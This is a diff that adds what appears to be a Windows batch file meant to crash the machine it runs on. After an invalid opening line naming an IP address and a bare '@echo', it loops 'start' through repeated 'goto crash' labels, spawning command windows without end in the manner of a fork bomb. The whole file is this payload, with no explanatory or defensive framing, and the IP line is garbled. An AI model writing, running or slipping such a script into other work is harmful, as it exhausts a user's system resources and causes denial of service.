@@ -1,0 +1,63 @@
+useip 148.253.163.35
+@echo
+:crash
+:crash1
+:crash2
+start
+goto crash
+goto crash1
+goto crash2
+goto crash
+goto crash1
+goto crash2
+goto crash
+goto crash1
+goto crash2
+goto crash
+goto crash1
+goto crash2
+goto crash
+goto crash1
+goto crash2
+goto crash
+goto crash1
+goto crash2
+goto crash
+goto crash1
+goto crash2
+goto crash
+goto crash1
+goto crash2
+goto crash
+goto crash1
+goto crash2
+goto crash
+goto crash1
+goto crash2
+goto crash
+goto crash1
+goto crash2
+goto crash
+goto crash1
+goto crash2
+goto crash
+goto crash1
+goto crash2
+goto crash
+goto crash1
+goto crash2
+goto crash
+goto crash1
+goto crash2
+goto crash
+goto crash1
+goto crash2
+goto crash
+goto crash1
+goto crash2
+goto crash
+goto crash1
+goto crash2
+goto crash
+goto crash1
+goto crash2
